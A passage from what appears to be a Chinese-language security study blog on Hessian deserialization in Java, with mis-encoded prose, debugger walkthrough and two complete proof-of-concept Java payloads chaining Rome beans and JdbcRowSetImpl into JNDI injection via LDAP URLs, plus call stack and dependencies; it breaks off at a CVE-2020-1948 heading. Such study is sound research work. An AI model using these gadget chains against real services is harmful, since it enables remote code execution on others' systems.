</span><br><span class="line">        person.setAge(<span class="number">18</span>);  </span><br><span class="line">        person.setName(<span class="string">&quot;Feng&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] s=serialize(person);  </span><br><span class="line">        System.out.println((Person) deserialize(s));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163340658.png" class=""><p>è¿™é‡Œå¯¹æ¯”å°±å¯ä»¥å‡ºæ¥Hessiançš„åºåˆ—åŒ–çš„æ•°æ®é•¿åº¦æ¯”JavaåŸç”Ÿçš„åºåˆ—åŒ–è¦çŸ­ã€‚</p><h2 id="Hessianååºåˆ—åŒ–æ¼æ´åˆ†æ"><a href="#Hessianååºåˆ—åŒ–æ¼æ´åˆ†æ" class="headerlink" title="Hessianååºåˆ—åŒ–æ¼æ´åˆ†æ"></a>Hessianååºåˆ—åŒ–æ¼æ´åˆ†æ</h2><p>è¿™é‡Œæˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹Hessianååºåˆ—åŒ–çš„æµç¨‹çœ‹ä¸€ä¸‹</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163753010.png" class=""><p>è¿™é‡Œè¦å…ˆè·Ÿè¿›è¿™ä¸ªread()æ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163815867.png" class=""><p>è¿™é‡Œä¼šè¿”å›77è¿™ä¸ªAsciiç ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè¿™é‡Œå…¶å®æ˜¯å› ä¸ºåœ¨Hessianåºåˆ—åŒ–å¯¹è±¡çš„æ—¶å€™æ€»æ˜¯ä¼šå°†ç»“æœå¤„ç†æˆä¸€ä¸ªMapæ‰€ä»¥åºåˆ—åŒ–ç»“æœçš„ç¬¬ä¸€ä¸ªbyteæ€»æ˜¯Mè€Œå®ƒçš„Asciiç å°±æ˜¯77</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164125221.png" class=""><p>è¿™é‡Œå‘ä¸‹èµ°å°±ä¼šè¿›å…¥åˆ°Mè¿™ä¸ªcaseé‡Œæˆ‘ä»¬è·Ÿè¿›readTypeæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164344199.png" class=""><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164401216.png" class=""><p>è¿™é‡Œå°±æ˜¯è·å–æˆ‘ä»¬åºåˆ—åŒ–è¿›å»çš„Personå¯¹è±¡çš„ç±»å‹ï¼Œç»§ç»­å›åˆ°åŸæ¥çš„ä½ç½®è·Ÿè¿›readMapæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164449298.png" class=""><p>è¿™é‡Œä¼šå…ˆæ ¹æ®ç±»å‹è·å–ä¸€ä¸ªååºåˆ—åŒ–å™¨ï¼Œå¦‚æœè·å–ä¸åˆ°å°±ä½¿ç”¨_hashMapDeserializeræ¥è¿›è¡ŒreadMapï¼Œå¦‚æœä»–ä¹Ÿä¸ºnullå°±æ–°å»ºä¸€ä¸ªHashMapç±»çš„ååºåˆ—åŒ–å™¨è°ƒç”¨readMapæ–¹æ³•ã€‚è¿™é‡Œæˆ‘ä»¬èƒ½å¤Ÿè·å–åˆ°Personçš„ååºåˆ—åŒ–å™¨è·Ÿè¿›å»çœ‹çœ‹</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231165052187.png" class=""><p>å…ˆå®ä¾‹åŒ–instantiateå¯¹è±¡ç„¶åè¿”å›readMapè·Ÿè¿›å»çœ‹çœ‹</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231165519755.png" class=""><p>è¿™é‡Œä¼šå¾ªç¯è·å–Personå¯¹è±¡ä¸­å±æ€§çš„å€¼ï¼Œç„¶åresolveè§£ææˆPersonå¯¹è±¡ã€‚è¿™å°±æ˜¯ä¸€ä¸ªæ­£å¸¸å¯¹è±¡çš„ååºåˆ—åŒ–æµç¨‹ã€‚</p><p>ä¸‹é¢æ¥çœ‹çœ‹æ¶æ„çš„é“¾æ˜¯æ€ä¹ˆè§¦å‘çš„æˆ‘ä»¬æ‰‹åŠ¨ç»™ä»–èµ‹å€¼è®©å…¶èµ°åˆ°æœ€åä¸€ä¸ªé€»è¾‘çœ‹çœ‹ä¼šè°ƒç”¨å“ªä¸ªreadMapé‡Œ</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170108193.png" class=""><p>è·Ÿè¿›çœ‹çœ‹</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170353815.png" class=""><p>è¡¥å……ä¸€ä¸‹å°±æ˜¯è¿™é‡Œçš„readObjectä¼šå»ç»§ç»­ååºåˆ—åŒ–è¯»å‡ºæ¥å‰é¢ä¼ å…¥çš„å€¼å½“ä½œkeyæ‰€ä»¥åé¢è°ƒç”¨é“¾ä¸­ä½¿ç”¨hashMap ä¼ å…¥çš„keyèƒ½å¤Ÿè¢«è§¦å‘ã€‚<br>å…³é”®ç‚¹åœ¨ä¸‹é¢çš„putæ–¹æ³•ä¸­ä»–ä¼šååºåˆ—åŒ–è·å–ä¸€ä¸ªå¯¹è±¡æ”¾å…¥keyçš„ä½ç½®ï¼Œåœ¨è·Ÿè¿›putæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170503061.png" class=""><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šè°ƒç”¨hashæ–¹æ³•è·Ÿè¿›å»</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170540480.png" class=""><p>è¿™é‡Œè°ƒç”¨é‡Œhashcodeæ–¹æ³•ï¼Œåœ¨å‰é¢åˆ†æè¿‡çš„Rmoeé“¾å­å°±å¯ä»¥åœ¨è¿™é‡Œä½¿ç”¨å…·ä½“è°ƒç”¨é“¾å‚è€ƒ<a href="https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Romeååºåˆ—åŒ–</a>è¿™é‡Œæˆ‘ç›´æ¥ç»™å‡ºPayloadåˆ©ç”¨çš„æ˜¯Jndiæ³¨å…¥çš„é“¾å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;  </span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Rome_Jndi</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">// ldap url  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/hdtx58&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// åˆ›å»ºJdbcRowSetImplå¯¹è±¡  </span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();  </span><br><span class="line">        jdbcRowSet.setDataSourceName(url);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// åˆ›å»ºtoStringBeanå¯¹è±¡  </span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// åˆ›å»ºObjectBean  </span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// åˆ›å»ºHashMap  </span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span>  makeMap(objectBean, <span class="string">&quot;aaaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–  </span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOutputStream);  </span><br><span class="line">        hessian2Output.writeObject(hashMap);  </span><br><span class="line">        hessian2Output.close();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–  </span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(fileInputStream);  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> (HashMap) hessian2Input.readObject();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ˜¯ä¾ç„¶æ˜¯åœ¨Windowsçš„ç¯å¢ƒä¸‹å¤ç°æˆåŠŸMacä¸‹æ²¡æˆåŠŸä¸çŸ¥é“ä¸ºå•¥â˜¹ï¸ã€‚</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250101165327865.png" class=""><p>è¿™é‡Œæ¥è´´ä¸€ä¸‹è°ƒç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:<span class="number">110</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">577</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2093</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">main:<span class="number">42</span>, Hessian_Rome_Jndi (org.example)</span><br></pre></td></tr></table></figure><p>è¡¥å……ä¸€ä¸ªå…¶ä»–å¸ˆå‚…çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Rome_Jndi</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);  </span><br><span class="line">        output.writeObject(o);  </span><br><span class="line">        System.out.println(bao.toString());  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> (T) o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://10.37.129.2:1389/oblxsg&quot;</span>;  </span><br><span class="line">        jdbcRowSet.setDataSourceName(url);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);  </span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//æ‰‹åŠ¨ç”ŸæˆHashMapï¼Œé˜²æ­¢æå‰è°ƒç”¨hashcode()  </span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);  </span><br><span class="line">        System.out.println(s);  </span><br><span class="line">        System.out.println((HashMap)deserialize(s));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ·»åŠ ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Apache-Dubbo-Hessianååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2020-1948ï¼‰"><a href="#Apache-Dubbo-Hessianååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2020-1948ï¼‰" class="headerlink" title="Apache Dubbo Hessianååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2020-1948ï¼‰"></a>Apache Dubbo Hessianååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2020-1948ï¼‰</h2><p>è¿™é‡Œç»§ç»­å†™å®Œè¿™ç¯‡ååºåˆ—åŒ–çš„å­¦ä¹ ï¼Œå› ä¸ºæœŸæœ«è€ƒè¯•åŠ 